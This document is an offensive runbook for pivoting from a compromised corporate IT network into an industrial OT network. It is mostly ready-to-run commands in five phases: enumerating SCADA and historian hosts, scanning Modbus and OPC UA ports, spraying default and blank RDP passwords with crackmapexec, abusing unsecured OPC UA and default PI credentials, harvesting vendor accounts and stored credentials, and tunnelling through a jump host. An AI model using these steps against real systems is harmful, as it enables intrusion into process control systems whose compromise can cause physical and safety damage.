# Runbook: IT to OT pivot

## Objective

Move from a foothold in the corporate IT network to a position inside the OT network from which process control systems can be reached. This is the most common and reliable OT entry path.

## Phase 1: Identify the boundary

From an IT foothold, map the topology toward OT:

```bash
# DNS lookup for OT-indicative hostnames
for prefix in scada hist hmi ics control plc eng opc dcs; do
  host $prefix.target.corp 2>/dev/null | grep "has address"
done

# Traceroute toward identified OT IP ranges to identify routing hops and firewalls
traceroute 10.20.0.1  # known OT segment gateway

# Scan for the IT/OT DMZ (historian and jump hosts typically here)
nmap -sT -Pn -p 3389,22,443,4840,102,502 10.20.0.0/24 -T2
```

Historian servers are usually in the 10.20.x.x or 172.16.x.x ranges in organisations following the Purdue model. Their hostnames frequently contain `hist`, `pi`, or `historian`.

## Phase 2: Compromise the DMZ/historian tier

The historian and engineering DMZ are the first step into OT. Common vulnerabilities:

Remote desktop with weak or default credentials:

```bash
# Test common credentials against RDP on discovered hosts
crackmapexec rdp 10.20.0.0/24 -u administrator -p 'Password123' --continue-on-success
crackmapexec rdp 10.20.0.0/24 -u administrator -p '' --continue-on-success  # blank password
```

OPC UA with no security mode:

```python
from opcua import Client
c = Client('opc.tcp://10.20.0.20:4840')
c.set_security_string("None")
c.connect()
# Enumerate and read all tags
```

OSIsoft PI with default credentials (default admin is blank or `piadmin`/blank):

```bash
curl -k -u 'piadmin:' 'https://10.20.0.20/piwebapi/assetservers'
```

## Phase 3: Reach Level 2 from the historian

Once inside the historian tier, identify direct routes to Level 2 SCADA and HMI systems:

```bash
# The historian has pre-configured data connections to Level 2 SCADA servers
# Check the PI server's data source configuration for SCADA IPs
# In PI System Management Tools: check interfaces and data sources

# Direct route check from historian host
# (if shell access achieved via RDP or OPC UA shell command)
netstat -rn
ping 10.30.0.1  # Level 2 SCADA
nmap -sT -Pn -p 80,443,3389,502,44818 10.30.0.0/24 -T2
```

## Phase 4: Vendor remote access

Identify vendor VPN or remote access credentials in the IT environment:

```bash
# Search Active Directory for service accounts associated with vendors
ldapsearch -x -H ldap://<DC> -b "DC=target,DC=corp" \
  "(&(objectClass=user)(sAMAccountName=*vendor*))" sAMAccountName description

# Look for stored VPN credentials
# Windows Credential Manager: cmdkey /list
# Saved RDP .rdp files in user profiles: dir /s /b *.rdp
```

Vendor accounts frequently have direct routes to Level 2 systems, over-permissioned access, and weak or unchanged default passwords.

## Phase 5: Establish a stable OT-segment foothold

Once a host in the OT network is accessible:

```bash
# Set up a SOCKS proxy through the OT jump host
ssh -D 1080 -N user@10.20.0.15  # historian or jump host

# Route all subsequent OT tool traffic through the proxy
proxychains python3 plc-enum.py 10.30.0.10
proxychains nmap -sT -Pn -p 502 10.30.0.0/24 -T2
```

Do not install C2 agents or run aggressive tooling on OT hosts. Maintain a minimal footprint: use the jump host as a relay, not as an exploitation platform.
